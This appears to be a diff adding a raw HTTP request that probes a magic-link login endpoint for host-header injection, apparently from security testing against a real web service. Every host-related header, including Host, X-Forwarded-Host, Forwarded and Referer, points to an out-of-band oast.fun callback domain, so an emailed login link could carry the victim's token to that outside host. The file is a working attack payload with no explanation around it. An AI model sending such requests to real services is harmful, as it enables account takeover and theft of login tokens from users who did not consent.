@@ -1,0 +1,25 @@
+POST /auth/api/mail-magic-link?id=1 HTTP/2
+Host: cknm3v72vtc0000dtjj0gj44b7oyyyyyb.oast.fun
+X-Forwarded-For: cknm3v72vtc0000dtjj0gj44b7oyyyyyb.oast.fun
+X-Forwarded-Host: cknm3v72vtc0000dtjj0gj44b7oyyyyyb.oast.fun
+X-Host: cknm3v72vtc0000dtjj0gj44b7oyyyyyb.oast.fun
+X-Http-Host-Override: cknm3v72vtc0000dtjj0gj44b7oyyyyyb.oast.fun
+X-Forwarded-Server: cknm3v72vtc0000dtjj0gj44b7oyyyyyb.oast.fun
+X-Forwarded: cknm3v72vtc0000dtjj0gj44b7oyyyyyb.oast.fun
+X-Forwarded-Proto: cknm3v72vtc0000dtjj0gj44b7oyyyyyb.oast.fun
+Forwarded: cknm3v72vtc0000dtjj0gj44b7oyyyyyb.oast.fun
+Referer: https://cknm3v72vtc0000dtjj0gj44b7oyyyyyb.oast.fun
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:117.0) Gecko/20100101 Firefox/117.0
+Accept: */*
+Accept-Language: en-GB,ne;q=0.7,en-US;q=0.3
+Accept-Encoding: gzip, deflate
+Content-Type: application/json
+X-Called-From-Server: false
+Content-Length: 92
+Dnt: 1
+Sec-Fetch-Dest: empty
+Sec-Fetch-Mode: cors
+Sec-Fetch-Site: same-origin
+Te: trailers
+
+{"emailAddress":"email","target":"https://app.swapcard.com/settings"}
